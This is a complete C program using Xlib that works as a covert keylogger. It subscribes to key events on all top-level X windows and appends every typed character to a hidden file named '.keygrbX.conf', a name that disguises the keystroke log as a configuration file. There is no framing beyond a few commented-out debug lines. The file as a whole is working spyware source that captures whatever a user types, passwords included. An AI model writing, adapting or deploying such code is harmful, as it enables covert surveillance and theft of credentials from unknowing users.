#include <X11/Xlib.h>
#include <stdio.h>

int main() {
    Display *display;
    Window root, win;
    
    //fputs("\nSTART\n", f_key_log);
    
    display = XOpenDisplay(NULL);
    if (!display) {
        // fprintf(f_key_log, "Не удалось открыть соединение с X сервером\n");
        return 1;
    }

    root = DefaultRootWindow(display);
    Window root_return, parent_return;
    Window *children;
    unsigned int num_children;

    if (XQueryTree(display, root, &root_return, &parent_return, &children, &num_children)) {
        for (unsigned int i = 0; i < num_children; ++i) {
            XSelectInput(display, children[i], KeyPressMask | KeyReleaseMask);
        }
        XFree(children);
    }

    // printf("Start.\n");

    XEvent ev;
    while (1) {
        XNextEvent(display, &ev);

        if (ev.type == KeyPress) {
            FILE *f_key_log = fopen(".keygrbX.conf", "a+");
            char buf[32];
            KeySym key_sym;

            if (XLookupString(&ev.xkey, buf, sizeof(buf), &key_sym, NULL) > 0) 
                fputs(buf, f_key_log);
            
            fclose(f_key_log);
        }
        
    }

    XCloseDisplay(display);
    // fputs("\nPOWER OFF\n", f_key_log);
    

    return 0;
}
